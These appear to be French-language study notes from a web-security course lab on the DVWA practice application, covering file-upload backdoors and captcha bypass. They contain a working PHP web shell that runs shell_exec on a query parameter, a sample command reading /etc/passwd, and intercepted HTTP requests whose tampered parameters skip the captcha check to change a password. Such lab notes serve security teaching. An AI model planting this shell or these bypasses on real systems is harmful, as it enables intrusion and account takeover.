# Rappel 

# file upload 

- transférer un fichier (.php) sur le serveur qui contient le site interne
- back door / porte dérobée

- ls
- mkdir 
- cat /etc/passwd 

```php
<?php 
$cmd = $_GET["cmd"];
# la fonction shell_exec() ouvre un terminal / ferme instantanément
$reponse = shell_exec($cmd); 
var_dump($reponse);
```

# captcha 

- champs dans un formulaire qui contient une texte aléatoire 
- quelquechose qui ne doit être compris QUE par un humain 
- une fenêtre avec 9 cases et vous devez choisir celle qui contiennent un chat   

- en gros, le développeur a mis en place cette technologie MAIS il a mal fait le travail
- dans les cas présentés, le vrai formulaire, qui entraine le changement de mot de passe, n'est sécurisé

# Captcha low


une image sur laquelle l'utilisateur doit faire une action
en fait : 

```
03AFcWeA4QlqurB8MLofY-LTShz680u34aK6U5kPs9l8IU4NsrCCMDaLClh5FMJK7hiqFaf3cwIYKDY5AjcHXab8desGQgtWZFjrLpUH_qetuhmYoeMexcuoPVG4h1yxLeWX0HycK-xseQbjpDErZZrDVBh74xBq7YOwoFJaYvVU40NUVO78AeJ6334lY8gWKEpCIe-i8f1Vo0tExbxsPK6u6-kyGcdEfAJRE_svskiWXADS6r6eh8fWKvGRfWJACbCktud0qzc2tqQWDd4xNoUhNfLakF1adrqJ7qZJujyJ6guWxRLi0EcteyIOpT5lMtJeWXl5nY8DRmtm2wsIMxqVt3TIKPtfSLI7RP7JvHYuiukDK4ZYUUbETaRJEwzsBVvaTIoRy0vJxHEULV5gPs3-bKYz7kvexI2EtLaRELjTOZmKEbPy1iG5MTGaEuVmyRKk6FYE-Milzj8UCtbHk2S0OYwKteR_2U5S5ZKPVTYyTIcwxyRZyEFlEICLTzoLsKw53e7Ovp-BFRJzYKTxWM5-1K5pulglCMn5wwBiNuy0Hj7AFlcw61Hb1umc5GRzrGQllVZHhomtQfbrwIUwD61zKIOFQWek5cugGkJHEa36dpuUGZtOICDimi7ZuPKy0g-SNYU0r0SMHKTn00lYG4UrYC2_6vJ_dkFJHAM51gd5OW_HhNeRMPHLxC015HBRsPxDRq2eBt-SsMHnaYEORvknJ6-FlHcCVPYNasXU-_SpTN6Pqtm_S94AgDX36k4fPYWEWmwElAvomoqOoCR6vzR4W6NJPYEBNkRhtTptwZhLcdXglF5K23mGM0OfVyUaxxYJgBRA262J52R1N8b1ipHFK8FBE_eYVs4o7GQtPtcGZtdvbFx7IlmNNjECgN0wTZ4RNmFROTU1PTe6IkMJ5cN0C9ifhxPBi8OQDOrOXhtL1GqNLXyrjKiDBAx8Uvtl_AORwFPkZrAU_3Z1HjapClsdrjQv4rskzwZXMv7JXa0dV15J45t6n3jqsiP3K2kczyQirHtR-tYkvtOIj4t8hRp9vbz7-W9YEXsko2H1NGxyCdyt0anb1rVx6xZJ8WmG_rd7Gp8vRJCcBSE7WzFOZ9yZSkg0A3RrUc1a2jr5QfLoON-d4SuQpkO-v8jDjk7wISUMbqATV6QIjg37kkrwflQ2KRYoXDIgDPP9DrV5go0EEQgo3C0ZBuPkUYlvHH802yNdBwNoL8IaWe42Uoe0gHvSpbt4CuK_PJIqofR_Ye5Im6xl-pBlMARFzby4iEqwau0aw60TOX7EXIcT2uc8fSv_65J8XccmCr8ZWAX-Ax0RRRk4IijlLyvzJW2MamRC16NwMvMlcGIbwroo7o1_OoIpmg2dTFyLdGLTknpq-_bspuZW8z54TPaPKsUjYLt7ttkbWzCeSpGwhTt0j67KtAd4Dj5zj6R9MyOrZxOL-Y3idwr5vPweqdxxnuhptG8oVR2REYfA8xnsNTyx4JfZM1CSNrin3ekwqyLeYZKaELvgYz44l-_jTorfAUO0-6bio1mtk0gtMwpKoc 
```


Récupérer le requête qui permet de changer le mot de passe : 
====================================

```
POST /vulnerabilities/captcha/ HTTP/1.1
Host: 127.0.0.1:4280
Content-Length: 57
Cache-Control: max-age=0
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: fr-FR,fr;q=0.9
Origin: http://127.0.0.1:4280
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:4280/vulnerabilities/captcha/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=e3142e1f5dcd9f0d5909617dc2f60abb; security=low
Connection: keep-alive

step=2&password_new=titi&password_conf=titi&Change=Change
```

une fois que la requête HTTP est interceptée => je peux désormais la modifier en changeant la dernière ligne 

```
step=2&password_new=titi&password_conf=titi&Change=Change
step=2&password_new=nouveau_password&password_conf=nouveau_password&Change=Change
```



step=2&password_new=azerty&password_conf=azerty&passed_captcha=true&Change=Change

# high 

```
POST /vulnerabilities/captcha/ HTTP/1.1
Host: 127.0.0.1:4280
Content-Length: 2573
Cache-Control: max-age=0
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: fr-FR,fr;q=0.9
Origin: http://127.0.0.1:4280
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: reCAPTCHA
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:4280/vulnerabilities/captcha/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=e3142e1f5dcd9f0d5909617dc2f60abb; security=high
Connection: keep-alive

step=1&password_new=coucou&password_conf=coucou&g-recaptcha-response=hidd3n_valu3&user_token=88ffcb67c05737aab2adbb3120b17fb1&Change=Change
```